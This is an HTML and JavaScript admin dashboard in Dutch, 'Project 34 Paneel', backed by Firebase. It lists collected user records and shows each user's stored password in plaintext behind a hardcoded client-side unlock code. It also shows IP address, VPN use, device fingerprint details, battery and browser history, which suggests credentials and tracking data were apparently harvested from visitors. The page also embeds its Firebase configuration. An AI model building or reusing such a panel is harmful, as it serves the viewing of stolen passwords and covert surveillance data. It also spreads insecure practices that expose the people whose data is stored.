<!DOCTYPE html>
<html lang="nl">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Project 34 Paneel – Terminal</title>

  <!-- Bestaande libs mogen blijven -->
  <link href="../css/css.css" rel="stylesheet">
  <link href="../css/custom.css" rel="stylesheet" type="text/css">
  <link href="../css/ssrpm.css" rel="stylesheet" type="text/css">
  <link rel="shortcut icon" href="../images/favicon.ico" type="image/x-icon">
  <link rel="icon" href="../images/favicon.ico" type="image/ico">
  <script src="../js/jquery.js"></script>
  <script src="../js/bootstrap.js"></script>

  <!-- Monospace voor terminal-look -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600;700&display=swap" rel="stylesheet">

  <style>
    :root{
      --bg: #ffffff;         /* witte terminal */
      --ink: #111111;        /* “inkt”/tekst */
      --muted: #4b4b4b;
      --accent: #111111;     /* zwart voor lijnen */
      --accent-2: #0b6cf0;   /* blauw voor focus */
      --danger: #e53935;
      --radius: 0;           /* terminal is hoekig */
      --cell-h: 38px;
    }
    *{box-sizing:border-box}
    html,body{height:100%}
    body{
      margin:0; background:var(--bg); color:var(--ink);
      font-family: "IBM Plex Mono", ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
      overflow-x:hidden;
    }

    /* Terminal frame */
    .term{
      max-width: 1100px; margin: 24px auto; padding: 0 16px 48px;
    }
    .ascii{
      white-space: pre; font-size: 13.5px; line-height: 1.4; margin: 0 0 16px 0; user-select: text;
    }
    .row{
      display: grid; grid-template-columns: 1fr 1fr; gap: 18px;
    }
    @media (max-width: 900px){ .row{ grid-template-columns: 1fr; } }

    /* Formulier elementen in ASCII vibe */
    .label{font-weight: 700; margin-bottom: 6px;}
    .input{
      width: 100%; height: var(--cell-h);
      padding: 8px 10px;
      background: transparent;
      color: var(--ink);
      border: 1px solid var(--accent);
      border-radius: var(--radius);
      outline: none;
      font: inherit;
    }
    .input::placeholder{ color: #999; }
    .input:focus{
      border-color: var(--accent-2);
      box-shadow: 0 0 0 2px rgba(11,108,240,.15);
    }

    /* ASCII knoppen: [ Inloggen ] */
    .btn{
      display:inline-block;
      height: var(--cell-h);
      padding: 8px 12px;
      border: 1px solid var(--accent);
      color: var(--ink);
      background: #fff;
      text-decoration: none;
      cursor: pointer;
      font: inherit;
      border-radius: var(--radius);
      position: relative;
    }
    .btn::before{ content:"["; margin-right:6px; }
    .btn::after{ content:"]"; margin-left:6px; }
    .btn:hover{ background: #f7f7f7; }
    .btn.primary{
      background:#fff;
      border-color: var(--accent);
      font-weight:700;
    }
    .btn.danger{ border-color: var(--danger); color: var(--danger); }
    .btn.ghost{ background: transparent; }

    /* Lijsten als terminalregels */
    .list{ display:flex; flex-direction:column; gap: 8px; }
    .list-item{
      padding: 10px 12px; border:1px solid var(--accent);
      background: #fff;
      cursor: pointer;
    }
    .list-item:hover{ background: #f7f7f7; }
    .list-item.selected{
      color:#fff; background:#111; border-color:#111;
    }

    .grid{
      display:grid; grid-template-columns: 1fr 420px; gap:18px;
    }
    @media (max-width: 1100px){ .grid{ grid-template-columns:1fr; } }

    .detail{
      border:1px solid var(--accent);
      padding: 12px;
      background:#fff;
    }
    .detail + .detail{ margin-top: 10px; }

    .mono{ font-family: inherit; }

    /* Subtle caret blink for prompts */
    .caret::after{
      content: "▁"; display:inline-block; margin-left: 2px; animation: blink 1.1s steps(1,end) infinite;
    }
    @keyframes blink{ 50%{opacity:0} }

    /* ASCII headings */
    .h{ white-space: pre; font-weight:700; }

    /* Helpers */
    .mb8{margin-bottom:8px}.mb12{margin-bottom:12px}.mb16{margin-bottom:16px}.mb20{margin-bottom:20px}
    .muted{ color: var(--muted); }
  </style>

  <!-- Firebase SDK -->
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-app.js";
    import {
      getAuth, signInWithEmailAndPassword, onAuthStateChanged, signOut,
      sendSignInLinkToEmail, isSignInWithEmailLink, signInWithEmailLink
    } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-auth.js";
    import { getFirestore, collection, getDocs, query, orderBy } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-firestore.js";

    const firebaseConfig = {
      apiKey: "AIzaSyClpvIHEe98giJTQxO-bNbUci0i4LOmj3U",
      authDomain: "project34-baebd.firebaseapp.com",
      projectId: "project34-baebd",
      storageBucket: "project34-baebd.firebasestorage.app",
      messagingSenderId: "92418567493",
      appId: "1:92418567493:web:6d51d4af2b66ed14c3e22c"
    };

    const app = initializeApp(firebaseConfig);
    const auth = getAuth(app);
    const db = getFirestore(app);

    onAuthStateChanged(auth, (user) => { user ? showDashboard() : showLoginForm(); });

    // Login (wachtwoord)
    window.loginUser = async function(){
      const email = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value;
      if(!email || !password){ alert('Vul e-mail en wachtwoord in.'); return; }
      try{ await signInWithEmailAndPassword(auth, email, password); }
      catch (error){ alert('Login mislukt: ' + error.message); }
    };

    // Magic link
    window.sendLoginLink = async function(){
      const email = document.getElementById('email').value.trim();
      if (!email) { alert('Vul je email in.'); return; }
      try {
        const actionCodeSettings = { url: window.location.href, handleCodeInApp: true };
        await sendSignInLinkToEmail(auth, email, actionCodeSettings);
        window.localStorage.setItem('emailForSignIn', email);
        alert('Login link verzonden. Controleer je email.');
      } catch (e) { alert('Kon geen login link versturen: ' + e.message); }
    };

    // Magic-link afronden (zonder top-level await)
    (async () => {
      if (isSignInWithEmailLink(auth, window.location.href)) {
        let email = window.localStorage.getItem('emailForSignIn');
        if (!email) email = window.prompt('Bevestig je email voor login');
        try {
          await signInWithEmailLink(auth, email, window.location.href);
          window.localStorage.removeItem('emailForSignIn');
        } catch (err) { alert('Email link login mislukt: ' + err.message); }
      }
    })();

    // ===== RENDER: LOGIN (ASCII look) =====
    function showLoginForm(){
      document.body.innerHTML = `
        <div class="term">
<pre class="ascii">┌──────────────────────────────────────────────────────────────────────────────┐
│ Project 34 Paneel – Admin Login                                              │
├──────────────────────────────────────────────────────────────────────────────┤
│ Gebruik e-mail + wachtwoord of vraag een magic link aan.                     │
└──────────────────────────────────────────────────────────────────────────────┘</pre>

          <div class="row">
            <div>
              <div class="h mb8">┌─ Login ─────────────────────────────────────────────────────────────┐</div>
              <div class="mb12">
                <div class="label">> e-mail</div>
                <input id="email" class="input" type="email" placeholder="naam@voorbeeld.nl" autocomplete="email" autofocus>
              </div>
              <div class="mb16">
                <div class="label">> wachtwoord</div>
                <input id="password" class="input" type="password" placeholder="••••••••" autocomplete="current-password">
              </div>
              <div class="mb16">
                <button class="btn primary" onclick="loginUser()">Inloggen</button>
                <button class="btn" onclick="sendLoginLink()">Stuur login-link</button>
                <a class="btn ghost" href="https://sgdcproject34.github.io/project34-spinoza/">Terug</a>
              </div>
              <div class="ascii muted">hint: typ je gegevens en druk op [ Inloggen ] ▒</div>
              <div class="h mb8">└─────────────────────────────────────────────────────────────────────┘</div>
            </div>

            <div>
              <div class="h mb8">┌─ Info ──────────────────────────────────────────────────────────────┐</div>
              <div class="detail">
                <div class="mb8">[i] ASCII-stijl interface met witte terminal-achtergrond.</div>
                <div class="mb8">[i] Focus: blauw kader. Selecties: inverse (wit op zwart).</div>
                <div class="mb8">[i] Magic link login wordt in deze pagina afgehandeld.</div>
                <div class="muted caret">ready</div>
              </div>
              <div class="h mb8">└─────────────────────────────────────────────────────────────────────┘</div>
            </div>
          </div>
        </div>
      `;
    }

    // ===== RENDER: DASHBOARD (ASCII look) =====
    async function showDashboard(){
      try{
        const usersSnapshot = await getDocs(query(collection(db, 'users'), orderBy('timestamp', 'desc')));
        const users = [];
        usersSnapshot.forEach((doc) => users.push({ id: doc.id, ...doc.data() }));

        document.body.innerHTML = `
          <div class="term">
<pre class="ascii">┌──────────────────────────────────────────────────────────────────────────────┐
│ Project 34 Paneel – Gebruikersdashboard                                      │
├──────────────────────────────────────────────────────────────────────────────┤
│ Zoek, selecteer een gebruiker links. Details verschijnen rechts.             │
└──────────────────────────────────────────────────────────────────────────────┘</pre>

            <div class="mb12" style="display:flex;gap:10px;align-items:center;justify-content:space-between">
              <div>
                <span class="label">> zoek</span>
                <input id="searchInput" class="input" placeholder="gebruikersnaam…" style="width:320px">
              </div>
              <button class="btn danger" onclick="logout()">Uitloggen</button>
            </div>

            <div class="grid">
              <div>
                <div class="h mb8">┌─ Lijst ─────────────────────────────────────────────────────────────┐</div>
                <div class="list" id="usersList">
                  ${users.map(user=>{
                    const ts = user.timestamp?.toDate ? user.timestamp.toDate()
                              : (user.timestamp ? new Date(user.timestamp) : null);
                    const tsStr = ts ? new Date(ts).toLocaleString() : '';
                    return `
                      <div class="list-item" onclick="selectUser(event, '${user.id}')">
                        - ${user.username || 'Onbekend'}  ${tsStr ? `· ${tsStr}` : ``}  ${user.ipAddress ? `· ${user.ipAddress}` : ``}
                      </div>
                    `;
                  }).join('')}
                </div>
                <div class="h mb8">└─────────────────────────────────────────────────────────────────────┘</div>
              </div>

              <div>
                <div class="h mb8">┌─ Details ───────────────────────────────────────────────────────────┐</div>
                <div id="userDetails" style="display:none">
                  <div id="userInfo"></div>
                </div>
                <div id="noSelection" class="detail">
                  [ ] Geen gebruiker geselecteerd.
                </div>
                <div class="h mb8">└─────────────────────────────────────────────────────────────────────┘</div>
              </div>
            </div>
          </div>
        `;

        // search
        document.getElementById('searchInput').addEventListener('input', function(e){
          const term = e.target.value.toLowerCase();
          document.querySelectorAll('.list-item').forEach(item=>{
            const txt = item.textContent.toLowerCase();
            item.style.display = txt.includes(term) ? '' : 'none';
          });
        });

        window.usersData = users; // global
      } catch (error) {
        console.error('Error loading dashboard:', error);
        alert('Fout bij laden dashboard: ' + error.message);
      }
    }

    // Select user (ASCII selection)
    window.selectUser = function(evt, userId){
      const user = window.usersData.find(u => u.id === userId);
      if (!user) return;

      document.querySelectorAll('.list-item').forEach(item => item.classList.remove('selected'));
      evt.currentTarget.classList.add('selected');

      document.getElementById('noSelection').style.display = 'none';
      const info = document.getElementById('userInfo');
      const box = document.getElementById('userDetails');
      box.style.display = 'block';

      const ts = user.timestamp?.toDate ? user.timestamp.toDate()
               : (user.timestamp ? new Date(user.timestamp) : null);
      const tsStr = ts ? new Date(ts).toLocaleString() : 'Onbekend';

      info.innerHTML = `
        <div class="detail">[ username ] ${user.username || 'Niet beschikbaar'}</div>

        <div class="detail">
          [ password ] <span class="mono" id="password-${userId}">••••••••</span><br>
          [  unlock  ] <input id="unlockCode-${userId}" class="input" type="password" placeholder="code" style="height:32px;margin-top:8px">
          <button class="btn" style="height:32px;margin-top:8px" onclick="unlockPassword('${userId}')">Ontgrendelen</button>
        </div>

        <div class="detail">[ vpn ] ${user.vpnUsed===true?'Ja':(user.vpnUsed===false?'Nee':'Onbekend')}</div>
        <div class="detail">[ ip ] <span class="mono">${user.ipAddress || 'Niet beschikbaar'}</span></div>
        <div class="detail">[ server ] ${user.serverLocation || 'Niet beschikbaar'}</div>
        <div class="detail">[ user-agent ] <span class="mono">${user.userAgent || 'Niet beschikbaar'}</span></div>
        <div class="detail">[ os ] ${user.operatingSystem || 'Niet beschikbaar'}</div>
        <div class="detail">[ screen ] ${user.screenSize || 'Niet beschikbaar'}</div>
        <div class="detail">[ lang ] ${user.language || 'Niet beschikbaar'}</div>
        <div class="detail">[ tz ] ${user.timezone || 'Niet beschikbaar'}</div>
        <div class="detail">[ battery ] ${user.battery || 'Niet beschikbaar'}</div>
        <div class="detail">[ history ] ${user.browserHistory || 'Niet beschikbaar'}</div>
        <div class="detail">[ timestamp ] ${tsStr}</div>
      `;
    };

    // Unlock password
    window.unlockPassword = function(userId){
      const code = document.getElementById('unlockCode-' + userId).value;
      if (code === '9461') {
        const user = window.usersData.find(u => u.id === userId);
        const passwordField = document.getElementById('password-' + userId);
        passwordField.textContent = user.password || 'Niet beschikbaar';
      } else { alert('Onjuiste code!'); }
    };

    // Logout
    window.logout = function(){ signOut(auth); };
  </script>
</head>

<body>
  <!-- Content wordt door JS gerenderd -->
</body>
</html>
